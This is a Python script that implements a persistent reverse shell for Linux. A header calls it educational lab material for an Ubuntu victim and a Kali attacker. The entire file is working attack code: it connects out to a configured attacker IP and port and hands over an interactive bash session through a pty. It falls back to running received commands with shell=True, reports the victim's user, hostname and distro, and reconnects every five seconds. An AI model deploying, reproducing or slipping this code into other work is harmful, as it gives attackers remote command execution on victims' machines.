#!/usr/bin/env python3
"""
Simple Reverse Shell for Linux Testing
Educational purposes only - Use in controlled lab environment
Ubuntu VM (victim) -> Kali VM (attacker)
"""

import socket
import subprocess
import os
import sys
import time
import pty

# Import configuration from root directory
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
import config

# Configuration from config.py
ATTACKER_IP = config.ATTACKER_IP
ATTACKER_PORT = config.ATTACKER_PORT

def create_connection():
    """Establish connection to attacker machine"""
    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        return s
    except Exception as e:
        return None

def spawn_shell(s):
    """Spawn a proper shell with PTY support"""
    try:

        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
 
        pty.spawn("/bin/bash")
    except Exception:
        basic_shell(s)

def basic_shell(s):
    """Basic shell without PTY (fallback)"""
    while True:
        try:
 
            command = s.recv(1024).decode().strip()
            
            if not command or command.lower() == 'exit':
                break

            if command.lower() == 'whoami':
                result = os.getenv('USER', 'unknown')
            elif command.lower() == 'pwd':
                result = os.getcwd()
            elif command.startswith('cd '):
                try:
                    directory = command[3:].strip()
                    os.chdir(directory)
                    result = f"Changed to: {os.getcwd()}"
                except Exception as e:
                    result = f"cd: {str(e)}"
            else:

                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
                    output = result.stdout
                    if result.stderr:
                        output += f"\nError: {result.stderr}"
                    result = output if output else "Command executed (no output)"
                except Exception as e:
                    result = f"Error executing command: {str(e)}"

            s.send(f"{result}\n".encode())
        
        except Exception:
            break

def main():
    """Main reverse shell function"""
    while True:
        try:

            connection = create_connection()
            
            if connection:

                hostname = socket.gethostname()
                username = os.getenv('USER', 'unknown')
                distro = subprocess.run(['lsb_release', '-d'], capture_output=True, text=True)
                distro_info = distro.stdout.split('\t')[1].strip() if distro.returncode == 0 else "Linux"
                
                initial_msg = f"[+] Connection established from {username}@{hostname} ({distro_info})\n"
                connection.send(initial_msg.encode())
                
                # Start shell session
                spawn_shell(connection)
                
                connection.close()
            
            time.sleep(5)
            
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(5)
            continue

if __name__ == "__main__":
    main()